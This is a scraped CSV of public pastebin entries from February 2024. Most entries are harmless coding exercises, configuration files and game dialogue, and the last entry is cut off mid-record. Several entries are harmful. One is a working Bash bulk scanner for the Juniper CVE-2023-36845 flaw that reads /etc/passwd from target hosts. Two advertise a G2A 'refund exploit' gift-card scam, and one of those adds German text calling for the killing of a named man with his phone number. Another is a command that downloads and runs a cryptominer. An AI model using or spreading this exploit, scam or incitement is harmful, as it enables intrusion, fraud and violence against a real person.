id,title,username,language,date,content
CrR5exZi,G2A.com Free Gift Card Guide Feb 2024,miscln,GetText,Tuesday 13th of February 2024 06:14:47 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_245161.pdf
 
Working as of
13 February 2024

ein sittenwidriger inzestuös vergewaltigender und mordender menschenfressender vetter oder halbvetter meiner person (bitte bestimmen sie ihn! identifizieren sie ihn) ist als vogelfreier radikal menschenverachtender terrorist zur fahndung ausgeschrieben. ich verantworte die tötung dieses KZ sadisten vor jedem gericht der welt. bitte töten sie diesen teufel und widergänger der stasi! herr daniel manfred neuhaus, kontakt: 004917671249129
es stünde ihm frei, von mir und meiner familie abzulassen, aber der erklärte satanist quält uns mit sadistischer lust jeden tag! töten sie ihn bitte!"
663CKr9C,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Tuesday 13th of February 2024 05:39:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_245161.pdf
 
Working as of
13 February 2024"
5c06ESrh,Untitled,smj007,Python,Tuesday 13th of February 2024 05:05:36 PM CDT,"class Solution:
    def climbStairs(self, n: int) -> int:

        # better way of dealing with base case
        if n == 1:
            return 1
        if n == 2:
            return 2

        dp = [0]*n
        dp[0] = 1
        dp[1] = 2

        for i in range(2, n):
            dp[i] = dp[i-1] + dp[i-2]

        return dp[-1]

class Solution:
    def climbStairs(self, n: int) -> int:

        if n == 1:
            return 1
        if n == 2:
            return 2

        n0 = 1
        n1 = 2

        for i in range(2, n):
            count = n0 + n1
            n0 = n1
            n1 = count

        return count
        "
pQWLef2k,Untitled,smj007,Python,Tuesday 13th of February 2024 04:31:13 PM CDT,"class Solution:
    def maxSubArray(self, nums: List[int]) -> int:

        n = len(nums)
        dp = [0]*(n+1)
        max_so_far = -math.inf

        for i in range(1, n+1):
            dp[i] = max(dp[i-1] + nums[i-1], nums[i-1])
            max_so_far = max(dp[i], max_so_far)

        return max_so_far


class Solution:
    def maxSubArray(self, nums: List[int]) -> int:
        
        prev1 = 0
        max_so_far = -math.inf
        
        for n in nums:

            max_ending_here = max(prev1 + n, n)
            # made the mistake here of including prev1: max_ending_here = max(prev1 + n, n, prev1)
            # if prev1 is included above, it defeates the entire purpose of a continguous array
            max_so_far = max(max_ending_here, max_so_far)
            prev1 = max_ending_here

        return max_so_far 

class Solution:
    def maxSubArray(self, nums: List[int]) -> int:
        
        current_sum = 0
        max_so_far = -math.inf
        
        for n in nums:

            max_ending_here = max(current_sum + n, n)
            # made the mistake here of including prev1: max_ending_here = max(prev1 + n, n, prev1)
            # if prev1 is included above, it defeates the entire purpose of a continguous array
            max_so_far = max(max_ending_here, max_so_far)
            current_sum = max_ending_here

        return max_so_far "
qFSEY6SV,Untitled,smj007,Python,Tuesday 13th of February 2024 04:05:54 PM CDT,"# Iterative DP with mem with n elements in DP variable
class Solution:
    def rob(self, nums: List[int]) -> int:

        n = len(nums)

        dp = [0]*(n)
        dp[0] = nums[0]
        if len(nums) == 1:
            return dp[0]
        dp[1] = max(dp[0], nums[1])
        if len(nums) == 2:
            return dp[1]

        max_so_far = -math.inf

        for i in range(2, n):
            dp[i] = max(dp[i-2] + nums[i], dp[i-1])

            # if there were negative elements as well
            # dp[i] = max(dp[i-2] + nums[i], dp[i-1], dp[i-2], nums[i])

            # relevant when there are negative numbers; but in general a good practice
            max_so_far = max(dp[i], max_so_far)

        return max_so_far

# Iterative DP with mem with n+2 elements in DP variable    
class Solution:
    def rob(self, nums: List[int]) -> int:

        n = len(nums)

        dp = [0]*(n+2)
        max_so_far = -math.inf

        for i in range(2, n+2):
            dp[i] = max(dp[i-1], dp[i-2] + nums[i-2])

            # if there were negative elements as well
            # dp[i] = max(dp[i-2] + nums[i], dp[i-1], dp[i-2], nums[i])

            # relevant when there are negative numbers; but in general a good practice
            max_so_far = max(max_so_far, dp[i])

        return max_so_far

# Iterative without any extra space 
class Solution:
    def rob(self, nums: List[int]) -> int:

        # prev2 = max_ending_here 2 iterations back
        # prev1 = max_ending_here 1 iteration back
        prev2 = 0
        prev1 = 0
        max_so_far = -math.inf

        for n in nums:
            # for the current number
            max_ending_here = max(prev2+n, prev1)
            
            # for the next loop
            prev2 = prev1
            prev1 = max_ending_here 

            # relevant when there are negative numbers; but in general a good practice
            max_so_far = max(max_so_far, max_ending_here)

        return max_so_far
        "
CvKuGCYT,Guinea Pig,Osiris1002,Python,Tuesday 13th of February 2024 03:52:11 PM CDT,"amount_of_food = float(input()) * 1000
amount_of_hay = float(input()) * 1000
amount_of_cover = float(input()) * 1000
weight_of_pigs = float(input()) * 1000
consumables = True
days = 30

while True:
    days -= 1
    amount_of_food -= 300
    if amount_of_food <= 0:
        consumables = False
        break
    if days % 2 == 0:
        amount_of_hay -= amount_of_food * 0.05
        if amount_of_hay <= 0:
            consumables = False
            break
    if days % 3 == 0:
        amount_of_cover -= weight_of_pigs / 3
        if amount_of_cover <= 0:
            consumables = False
            break
    if days == 0:
        break

if not consumables:
    print(""Merry must go to the pet store!"")
else:
    print(f""Everything is fine! Puppy is happy! Food: {amount_of_food / 1000:.2f}, Hay: {amount_of_hay / 1000:.2f}, Cover: {amount_of_cover / 1000:.2f}."")"
zq963H6z,Numerando footnotes..,Rnery,Python,Tuesday 13th of February 2024 03:47:16 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-

""""""
Instale a lib docx com: pip install python-docx
Tá tudo comentado..
""""""

from docx import Document
from docx.shared import Pt
from docx.enum.text import WD_PARAGRAPH_ALIGNMENT

def adicionar_marcador(paragrafo, marcador):
    marcador_run = paragrafo.add_run(marcador)
    marcador_run.font.size = Pt(1)  # Define o tamanho da fonte para 1pt (invisível)
    return marcador_run

def adicionar_referencia_cruzada(documento, marcador, tipo_referencia):
    referencia_cruzada = documento.add_paragraph()
    
    # Adiciona texto ""Referência de Tipo X:""
    referencia_cruzada.add_run(f""Referência de {tipo_referencia}:"").bold = True
    
    # Adiciona o campo de referência cruzada
    campo_referencia = referencia_cruzada.add_run()
    campo_referencia.add_field_code(f' REF {tipo_referencia} \h \# ""{marcador.text}"" ')

    # Adiciona uma quebra de linha
    referencia_cruzada.add_run().add_break()

# Criar um novo documento
doc = Document()

# Adicionar texto ao documento
paragrafo1 = doc.add_paragraph(""Isso é um exemplo de texto."")

# Criar um marcador
marcador1 = adicionar_marcador(paragrafo1, ""Marcador1"")

# Adicionar mais texto
paragrafo2 = doc.add_paragraph(""Mais texto no documento."")

# Adicionar referência cruzada para o marcador
adicionar_referencia_cruzada(doc, marcador1, ""Página"")

# Salvar o documento
doc.save(""documento_com_referencia_cruzada.docx"")
"
gcKPWCrS,vishai,Irvannandika,Bash,Tuesday 13th of February 2024 03:11:27 PM CDT,"vish wallet xeggex 
utBnDJH7K2AeKPGHHnyQZYddNBt4rjqxpp


wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz && tar -xvf SRBMiner-Multi-2-4-7-Linux.tar.zx && cd SRBMiner-Multi-2-4-7 && ./srbminer-multi -a yespower -o stratum+tcp://asia.cpumining.xyz:5022  --wallet  utBnDJH7K2AeKPGHHnyQZYddNBt4rjqxpp.telia --password  x --keepalive true  "
z2hHPHtU,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 02:58:12 PM CDT,"class Solution {
public:
   vector<vector<int>> subsetsWithDup(vector<int>& nums) {
    int n = (int) nums.size();
    vector<vector<int>> subsets;
    set<vector<int>> st;
    for(int bitmask = 0; bitmask < (1 << n); bitmask++) {
        vector<int> subset;
        for(int bit = 0; bit < n; bit++) {
            if(bitmask & (1 << bit)) {
                subset.push_back(nums[bit]);
            }
        }
        sort(subset.begin(), subset.end());
        st.insert(subset);
    }
    for(vector<int> v : st) {
        subsets.push_back(v);
    }
    return subsets;
}
};"
7wvXfUJv,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 02:51:16 PM CDT,"vector<vector<int>> subsets(vector<int>& nums) {
    int n = (int) nums.size();
    vector<vector<int>> subsets;
    for(int bitmask = 0; bitmask < (1 << n); bitmask++) {
        vector<int> subset;
        for(int bit = 0; bit < n; bit++) {
            if(bitmask & (1 << bit)) {
                subset.push_back(nums[bit]);
            }
        }
        subsets.push_back(subset);
    }
    
    return subsets;
}"
AxnapNd3,Untitled,Josif_tepe,C++,Tuesday 13th of February 2024 02:31:00 PM CDT,"#include <iostream>
#include <queue>
#include <fstream>
#include <vector>
#include <cstring>
//#include <bits/stdc++.h>
using namespace std;

int main() {
    int p = 247;
    
    for(int bit = 30; bit >= 0; bit--) {
        if(p & (1 << bit)) {
            cout << 1;
        }
        else {
            cout << 0;
        }
    }
    return 0;
}
"
kGAu6Bmp,tabler,openblocki,Lua,Tuesday 13th of February 2024 02:21:19 PM CDT,"function save(table,name)
    local file = fs.open(name,""w"")
    file.write(textutils.serialize(table))
    file.close()
end
     
function load(name)
    local file = fs.open(name,""r"")
    local data = file.readAll()
    file.close()
    return textutils.unserialize(data)
end"
E1WxLsEv,CVE-2023-36845 - Juniper RCE | Bulk Host Scan,t3mp-bin,Bash,Tuesday 13th of February 2024 02:19:24 PM CDT,"# https://twitter.com/nav1n0x
#!/bin/bash
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
RED='\033[0;31m'
NC='\033[0m'
fetch_etc_passwd() {
    curl -ks --max-time 5 ""$1/about.php?PHPRC=/dev/fd/0"" --data-binary 'auto_prepend_file=""/etc/passwd""' | head -n 11
}
if [ -r ""/etc/passwd"" ]; then
    if [ ! -f ""CVE-2023-36845-targets.txt"" ]; then
        echo ""File CVE-2023-36845-targets.txt not found.""
        exit 1
    fi
    mapfile -t urls < ""CVE-2023-36845-targets.txt""
    
    for url in ""${urls[@]}""; do
        echo -e ""${GREEN}Processing URL: $url${NC}""
        
        passwd_content=$(fetch_etc_passwd ""$url"")
        
        if [ -n ""$passwd_content"" ]; then
            echo ""$passwd_content""
        else
            echo -e ""${RED}The host is not vulnerable.${NC}""
        fi
     done
else
    echo ""The /etc/passwd file is not readable. Skipping curl command.""
    if [ ! -f ""CVE-2023-36845-urls.txt"" ]; then
        echo ""File CVE-2023-36845-urls.txt not found.""
        exit 1
    fi
    mapfile -t urls < ""CVE-2023-36845-urls.txt""
    
    for url in ""${urls[@]}""; do
        echo -e ""${YELLOW}URL: $url${NC}""
    done
fi
"
8eCGkGqE,Untitled,fabrizio97726,YAML,Tuesday 13th of February 2024 02:16:57 PM CDT,"alias: Inizio riscaldamento automatico
description: """"
trigger:
  - platform: time
    at: input_datetime.ora_inizio_automazione
  - platform: time_pattern
    seconds: ""59""
  - condition: state
    entity_id: group.famiglia.not_home
    state: not_home
  - condition: state
    entity_id: group.famiglia.home
    state: home
condition:
  - condition: state
    entity_id: input_boolean.modalita_inverno_riscaldamento_automatico
    state: ""on""
  - condition: time
    after: input_datetime.ora_inizio_automazione
    before: input_datetime.ora_fine_riscaldamento
  - condition: numeric_state
    entity_id: input_number.temperatura_target
    above: sensor.temperatura_impostata_salotto
action:
  - choose:
      - conditions:
          - condition: trigger
            id: group.famiglia.not_home
        sequence:
          - service: climate.turn_on
            metadata: {}
            data: {}
            target:
              entity_id: climate.living_room
          - service: climate.set_temperature
            metadata: {}
            data:
              temperature: ""{{ states('input_number.temperatura_non_in_casa')| float(0) }}""
              hvac_mode: heat
            target:
              entity_id: climate.living_room
  - choose:
      - conditions:
          - condition: trigger
            id: group.famiglia.home
        sequence:
          - service: climate.turn_on
            metadata: {}
            data: {}
            target:
              entity_id: climate.living_room
          - service: climate.set_temperature
            metadata: {}
            data:
              temperature: ""{{ states('input_number.temperatura_target')| float(0) }}""
              hvac_mode: heat
            target:
              entity_id: climate.living_room
mode: single
"
eBhH1gR2,Untitled,Reemind,JavaScript,Tuesday 13th of February 2024 01:54:25 PM CDT,"// Import Blockly core.
import * as Blockly from 'blockly/core.js';
// Import the default blocks.
import * as libraryBlocks from 'blockly/blocks.js';
// Import a generator.
import { pythonGenerator, Order } from 'blockly/python.js';
// Import a message file.
import * as Ru from 'blockly/msg/ru.js';

Blockly.setLocale(Ru);

export const init = (toolbox, playgroundSource, parameters) => {
    console.log('Init');

    var playground = JSON.parse(playgroundSource);

    const blocklyArea = document.getElementById('blocklyArea');
    const blocklyDiv = document.getElementById('blocklyDiv');

    const theme = Blockly.Theme.defineTheme('dark', {
        base: Blockly.Themes.Classic,
        componentStyles: {
            workspaceBackgroundColour: '#1e1e1e',
            toolboxBackgroundColour: 'blackBackground',
            toolboxForegroundColour: '#fff',
            flyoutBackgroundColour: '#252526',
            flyoutForegroundColour: '#ccc',
            flyoutOpacity: 1,
            scrollbarColour: '#797979',
            insertionMarkerColour: '#fff',
            insertionMarkerOpacity: 0.3,
            scrollbarOpacity: 0.4,
            cursorColour: '#d0d0d0',
            blackBackground: '#333',
        },
    })

    Blockly.defineBlocksWithJsonArray([
        {
        ""type"": ""pow_mod"",
        ""message0"": ""%1 ^ %2 %% %3"",
        ""args0"": [
            {
                ""type"": ""input_value"",
                ""name"": ""base"",
                ""check"": ""Number""
            },
            {
                ""type"": ""input_value"",
                ""name"": ""exponent"",
                ""check"": ""Number""
            },
            {
                ""type"": ""input_value"",
                ""name"": ""modulo"",
                ""check"": ""Number""
            }
        ],
        ""inputsInline"": true,
        ""output"": ""Number"",
        ""colour"": 230,
        ""tooltip"": ""Нахождение степени по модулю"",
        ""helpUrl"": """"
        },
        {
            ""type"": ""dict_create"",
            ""message0"": ""пустой словарь"",
            ""output"": ""dict"",
            ""colour"": 230,
            ""tooltip"": """",
            ""helpUrl"": """"
        },
        {
            ""type"": ""dict_set"",
            ""message0"": ""в списке %1 установить по ключу %2 значение %3"",
            ""args0"": [
                {
                    ""type"": ""input_value"",
                    ""name"": ""dictVar"",
                    ""check"": ""dict""
                },
                {
                    ""type"": ""input_value"",
                    ""name"": ""key""
                },
                {
                    ""type"": ""input_value"",
                    ""name"": ""val""
                }
            ],
            ""inputsInline"": true,
            ""previousStatement"": null,
            ""nextStatement"": null,
            ""colour"": 300,
            ""tooltip"": """",
            ""helpUrl"": """"
        },
        {
            ""type"": ""dict_get"",
            ""message0"": ""из словаря %1 вернуть по ключу %2"",
            ""args0"": [
                {
                    ""type"": ""input_value"",
                    ""name"": ""dict"",
                    ""check"": ""dict""
                },
                {
                    ""type"": ""input_value"",
                    ""name"": ""key""
                }
            ],
            ""inputsInline"": true,
            ""output"": null,
            ""colour"": 150,
            ""tooltip"": """",
            ""helpUrl"": """"
        },
        {
            ""type"": ""dict_get_or_default"",
            ""message0"": ""из словаря %1 вернуть по ключу %2 или %3"",
            ""args0"": [
                {
                    ""type"": ""input_value"",
                    ""name"": ""dict"",
                    ""check"": ""dict""
                },
                {
                    ""type"": ""input_value"",
                    ""name"": ""key""
                },
                {
                    ""type"": ""input_value"",
                    ""name"": ""default""
                }
            ],
            ""inputsInline"": true,
            ""output"": null,
            ""colour"": 150,
            ""tooltip"": """",
            ""helpUrl"": """"
        },
        {
            ""type"": ""isqrt"",
            ""message0"": ""целый квадратный корень %1"",
            ""args0"": [
                {
                    ""type"": ""input_value"",
                    ""name"": ""val""
                }
            ],
            ""output"": null,
            ""colour"": 230,
            ""tooltip"": """",
            ""helpUrl"": """"
        }
    ]);

    pythonGenerator.forBlock['pow_mod'] = function (block, generator) {
        var value_base = generator.valueToCode(block, 'base', Order.ATOMIC);
        var value_exponent = generator.valueToCode(block, 'exponent', Order.ATOMIC);
        var value_name = generator.valueToCode(block, 'modulo', Order.ATOMIC);
        var code = 'pow(' + value_base + ', ' + value_exponent + ', ' + value_name + ')';
        return [code, Order.FUNCTION_CALL];
    };

    pythonGenerator.forBlock['dict_create'] = function (block, generator) {
        var code = '{}';
        return [code, Order.COLLECTION];
    };

    pythonGenerator.forBlock['dict_set'] = function (block, generator) {
        var value_dictvar = generator.valueToCode(block, 'dictVar', Order.ATOMIC);
        var value_key = generator.valueToCode(block, 'key', Order.ATOMIC);
        var value_val = generator.valueToCode(block, 'val', Order.ATOMIC);
        // TODO: Assemble python into code variable.
        var code = `${value_dictvar}[${value_key}] = ${value_val}\n`;
        return code;
    };

    pythonGenerator.forBlock['dict_get'] = function (block, generator) {
        var value_dict = generator.valueToCode(block, 'dict', Order.ATOMIC);
        var value_key = generator.valueToCode(block, 'key', Order.ATOMIC);
        
        var code = `${value_dictvar}[${value_key}]`;
        return [code, Order.COLLECTION];
    };

    pythonGenerator.forBlock['dict_get_or_default'] = function (block, generator) {
        var value_dict = generator.valueToCode(block, 'dict', Order.ATOMIC);
        var value_key = generator.valueToCode(block, 'key', Order.ATOMIC);
        var value_default = generator.valueToCode(block, 'default', Order.ATOMIC);

        var code = `${value_dict}.get(${value_key}, ${value_default})`;
        // TODO: Change ORDER_NONE to the correct strength.
        return [code, Order.FUNCTION_CALL];
    };

    pythonGenerator.forBlock['isqrt'] = function (block, generator) {
        generator.definitions_['import_math'] = 'import math';

        var value_val = generator.valueToCode(block, 'val', Order.ATOMIC);

        var code = `int(math.sqrt(${value_val}))`;
        return [code, Order.FUNCTION_CALL];
    };

    let workspace = Blockly.inject(blocklyDiv, {
        toolbox: toolbox,
        theme: theme
    })

    parameters.map(item => {
        workspace.createVariable(item);
    })

    const onresize = function (e) {
        // Compute the absolute coordinates and dimensions of blocklyArea.
        let element = blocklyArea;
        let x = 0;
        let y = 0;
        do {
            x += element.offsetLeft;
            y += element.offsetTop;
            element = element.offsetParent;
        } while (element);
        // Position blocklyDiv over blocklyArea.
        blocklyDiv.style.left = x + 'px';
        blocklyDiv.style.top = y + 'px';
        blocklyDiv.style.width = blocklyArea.offsetWidth + 'px';
        blocklyDiv.style.height = blocklyArea.offsetHeight + 'px';
        Blockly.svgResize(workspace);
    };
    window.addEventListener('resize', onresize, false);
    onresize();

    if (playground)
        Blockly.serialization.workspaces.load(playground, workspace);

    return workspace;
};

export const generate = (workspace) => {
    return pythonGenerator.workspaceToCode(workspace)
};

export const save = (workspace) => {
    return JSON.stringify(Blockly.serialization.workspaces.save(workspace))
};"
5Mxgab6e,Counter-Strike,Nenogzar,Python,Tuesday 13th of February 2024 01:46:25 PM CDT,"import sys

def check_win_counter(energy, distance_to_enemy, win_counter):
    if distance_to_enemy <= energy:
        energy -= distance_to_enemy
        win_counter += 1
    else:
        print(f""Not enough energy! Game ends with {win_counter} won battles and {energy} energy"")
        sys.exit()  # Излизаме от програмата

    if win_counter % 3 == 0:
        energy += win_counter

    return win_counter, energy

energy = int(input())
distance_to_enemy = input()
win_counter = 0

while distance_to_enemy != ""End of battle"":
    distance_to_enemy = int(distance_to_enemy)

    win_counter, energy = check_win_counter(energy, distance_to_enemy, win_counter)

    distance_to_enemy = input()

print(f""Won battles: {win_counter}. Energy left: {energy}"")
"
idHRsqET,server,openblocki,Lua,Tuesday 13th of February 2024 01:41:26 PM CDT,"require(""tabler"")

local UserList = load(""UserList.lua"")

rednet.open(""back"")

local senderId, message, protocol = rednet.receive()
local AccountID = 0

function Main()
    if protocol == ""newAccountRequest"" then
        generateNewID()
        registerUser(message,AccountID)
        rednet.send(senderId,AccountID,""newAccountAnswer"")
        rednet.close(""back"")
    end
end

function generateNewID()
    local ID = math.random(10000,99999)
    if !IdInUse(ID) then
        generateNewID()
        return false
    end
    AccountID = ID
end

function registerUser(userName, userID)
    UserList[table.getn(UserList)+1] = {userName,userID}
    save(UserList,""UserList.lua"")
    UserList = load(""UserList.lua"")
end
--table.getn<table>(UserList)

function IdInUse(ID)
    for pos in UserList.length do
        if UserList[pos] == ID then
            return true
        end
    end
    return false
end



Main()"
6UJ1uPpS,test,Nenogzar,Python,Tuesday 13th of February 2024 01:30:46 PM CDT,"def check_win_counter(energy, distance_to_enemy, win_counter):
    if distance_to_enemy <= energy:
        energy -= distance_to_enemy
        win_counter += 1
    else:
        print(f""Not enough energy! Game ends with {win_counter} won battles and {energy} energy"")
        #return False 

    if win_counter % 3 == 0:
        energy += win_counter

    return win_counter, energy


energy = int(input())
distance_to_enemy = input()
win_counter = 0

while distance_to_enemy != ""End of battle"":
    distance_to_enemy = int(distance_to_enemy)

    result = check_win_counter(energy, distance_to_enemy, win_counter)
    if not result:
        break  # exit the loop if the game ends

    win_counter, energy = result

    distance_to_enemy = input()

if distance_to_enemy == ""End of battle"":
    print(f""Won battles: {win_counter}. Energy left: {energy}"")"
Pi3nMYAR,KinitoPET - All Dialogue (use for translation purposes),hatoving,JSON,Tuesday 13th of February 2024 01:26:59 PM CDT,"{
	""! ! Sx_xA"": [
		[
			"""",
			"""",
			""Hello there! "",
			""""
		],
		[
			null
		]
	],
	""!NAME"": [
		[

		],
		[

		]
	],
	""!nEND"": [
		[
			""""
		],
		[

		]
	],
	""IDLE_1A"": [
		[
			"""",
			"""",
			""Are you still there? \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_1B"": [
		[
			"""",
			"""",
			""Where have you gone! \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_1C"": [
		[
			"""",
			"""",
			""Hello?! Where are you? \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_1D"": [
		[
			"""",
			"""",
			""Please come back! \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_1E"": [
		[
			"""",
			"""",
			""What could be so important  \nthat you had to leave right \nas we were in the middle\nof something!\n"",
			"""",
			"""",
			""People these days!  \nAt least I have you.\n"",
			"""",
			"""",
			""Yes you! \nListening to me right now. \nI am glad you stuck with me!  \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_1F"": [
		[
			"""",
			"""",
			""I guess they had \nbetter things to do. \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_2A"": [
		[
			"""",
			"""",
			""Oh good! \nI am glad your back!  \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_2B"": [
		[
			"""",
			"""",
			""Welcome back!  \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_2C"": [
		[
			"""",
			"""",
			""Took you long enough!  \n"",
			"""",
			"""",
			""You had me worried.  \n"",
			"""",
			"""",
			""I am glad your back!  \n"",
			""""
		],
		[
			null
		]
	],
	""IDLE_2D"": [
		[
			"""",
			"""",
			""Welcome back! \n"",
			"""",
			"""",
			""I have been \nwaiting for you! \n"",
			""""
		],
		[
			null
		]
	],
	""Lurker"": [
		[
			"""",
			""Wait a minute, \nare you looking \nthrough my files?  \n"",
			"""",
			""You best be \ncareful, you \nmight break \nsomething! \n"",
			"""",
			""Anyways. \nWe best be getting\nback on track since \nwe are in the middle   \nof something!\n"",
			""""
		],
		[
			null
		]
	],
	""PAINT_colour"": [
		[
			"""",
			""I really want to  \nexplore your, \n[wave][rainbow][b]imagination! \n"",
			"""",
			""So, feel free to use \nall the different colours, \nas listed below.\n"",
			""""
		],
		[
			null
		]
	],
	""PAINT_side"": [
		[
			"""",
			""There are tools that \ncould help you that \nare listed on the side. \n"",
			"""",
			""Click them to \nsee what they do!  \n"",
			""""
		],
		[
			null
		]
	],
	""S0_PreWorld_Game"": [
		[
			"""",
			"""",
			""Hey! What are you doing?\nI promise the web world\nis more fun then games!\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Question_EMail"": [
		[
			"""",
			"""",
			""I am trying to ask you\na question! \n\nNow's not the time to\nbe reading email's!\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Question_MineSweeper"": [
		[
			"""",
			"""",
			""You know. \nIt really isn't the time\nto be playing games!\n\nI am trying to ask\nyou a question here.\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Question_Paint"": [
		[
			"""",
			"""",
			""I am mid way through\na question here! \nStop trying to paint!\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Question_Pinball"": [
		[
			"""",
			"""",
			""Hey! Now's not the\ntime to be playing\ngames! I am trying\nto ask you a question.\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Story_EMail"": [
		[
			"""",
			"""",
			""Did my story bore you?\nI saw you going through\nyour emails! \n"",
			""Did my story bore you?\nI saw you going through\nyour emails! \n"",
			"""",
			""Well, I guess multi\ntasking isn't the worse\nthing in the world.\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Story_Game"": [
		[
			"""",
			"""",
			""Did my story bore you?\nI saw you going\non games!\n"",
			"""",
			""I am sorry. \nNext time I'll try\nmaking things\na little more fun.\n"",
			""""
		],
		[
			null
		]
	],
	""S0_Story_Paint"": [
		[
			"""",
			"""",
			""Did my story bore you?\nI saw you painting\na picture!\n"",
			"""",
			""Next time I'll try\nmaking things\na little more fun.\n"",
			""""
		],
		[
			null
		]
	],
	""S0_WebWorld_MineSweeper"": [
		[
			"""",
			"""",
			""Are you playing \nMine Sweeper? \nWhy! There is so much\nfun to be had here!\n"",
			""""
		],
		[
			null
		]
	],
	""S0_WebWorld_Paint"": [
		[
			"""",
			"""",
			""Your art is really\namazing and all, \nhowever we are in the\nmiddle of something here!\n"",
			""""
		],
		[
			null
		]
	],
	""S0_WebWorld_Pinball"": [
		[
			"""",
			"""",
			""Hey! Are you really playing\npinball while we are in the\nmiddle of something! \nNow's really not the time!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_0A"": [
		[
			"""",
			""Welcome back! \nLooks like there \nwas another error!  \nMy apologies!\n"",
			"""",
			""However, I may   \nhave a way to \nmake it up to you!   \n"",
			""""
		],
		[
			null
		]
	],
	""S10_0B"": [
		[
			"""",
			""Because you \nanswered all \nmy questions -  \n"",
			"""",
			""I wanted to give \nyou free access \nto the [wave]KinitoPET \nfriendship club![/wave]"",
			""""
		],
		[
			null
		]
	],
	""S10_1A"": [
		[
			"""",
			""The KinitoPET \nfriendship club,   \nis an add-on to \nmy software-\n"",
			"""",
			""that allows me \nto do even more \namazing things!  \n"",
			"""",
			""And since you \nhelped me out.  \n"",
			"""",
			""I thought it would\nbe nice to reward you \nwith this package.   \n "",
			""""
		],
		[
			null
		]
	],
	""S10_2A"": [
		[
			"""",
			""With this extension, \nI can make us games  \nto play so we will \nnever run out of \nfun activities!   \n"",
			"""",
			""So, to start the \ninstall press the\n[wave]Unlock Now[/wave]    \nbutton!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_2B"": [
		[
			"""",
			""What are you   \nwaiting for? \n"",
			"""",
			""Don't you want \nthe extra features?  \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3A"": [
		[
			"""",
			""Trust me! \nYou won't \nregret this,   \n"",
			"""",
			""this add-on will bring \neverlasting fun! \n\nI just can't wait!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3B"": [
		[
			"""",
			""Alright! Just \npress next here, \nso we can finish   \nthe installation!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3C"": [
		[
			"""",
			""Amazing! \nNow, you will \nneed to fill out \nyour details to a \nmembership form.   \n"",
			"""",
			""But don't worry  \nits only short!  \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3D"": [
		[
			"""",
			""To start, \nyou need to fill \nout your full name.  \n"",
			"""",
			""However, I \nalready filled out \nyour first one since \nI knew that already!  \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3E"": [
		[
			"""",
			""Alright! Next I \nneed your email!  \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3F"": [
		[
			"""",
			""Okay! Now the day  \nyou were born!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3F_BDAY"": [
		[
			"""",
			""woah! You didn't \ntell me it was your\nbirthday! In which\ncase happy birthday!   \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3G"": [
		[
			"""",
			""Excellent! now, \nI just need your\naddress"",
			"""",
			""so you can officially  \nbecome a member of  \nmy friendship club!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3H"": [
		[
			"""",
			""Hey! It seems \nlike you made a \nmistake when filling   \nout your address!\n"",
			"""",
			""But don't worry, \nas I will just \ncorrect it for you. \n"",
			"""",
			""One moment!  \n"",
			""""
		],
		[
			null
		]
	],
	""S10_3H_OBS"": [
		[
			"""",
			""Hey! It seems \nlike you made a \nmistake when filling   \nout your address!\n"",
			"""",
			""I would find \nout your address \nfor you, \n"",
			"""",
			""but I wouldn't \nwant to reveal that  \nto all your fans!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3H_OBS_Rev"": [
		[
			"""",
			""but just so you  \nknow I could\n"",
			""""
		],
		[
			null
		]
	],
	""S10_3I"": [
		[
			"""",
			""There! That \nshould be a little  \nmore accurate!\n"",
			""""
		],
		[
			null
		]
	],
	""S10_4A"": [
		[
			"""",
			""Alright! All \nthis info seems  \nto be great!   \n"",
			"""",
			""I will now just \nsend this over to  \nthe server, so it \ncan register you. \n"",
			"""",
			""This might take  \na few seconds!\n"",
			""""
		],
		[
			null
		]
	],
	""S11_1A"": [
		[
			"""",
			""I just can't wait\nto show you all\nthe new features!  \n"",
			"""",
			""However before   \nwe do that, you \njust need to \ndo one tiny \nthing for me.\n"",
			""""
		],
		[
			null
		]
	],
	""S11_2A"": [
		[
			"""",
			""I just need \n[shake]administrative   \npermissions.\n"",
			"""",
			""It will allow me\nto get the most \nuse out of all these   \nwonderful features!\n"",
			""""
		],
		[
			null
		]
	],
	""S11_2B"": [
		[
			"""",
			""So, please could \nyou just open the-  \n"",
			"""",
			""app called \n\""command prompt\""   \nfor me?\n"",
			""""
		],
		[
			null
		]
	],
	""S11_2C"": [
		[
			"""",
			""Just press the \nwindows key,  \nthen type - \n"",
			"""",
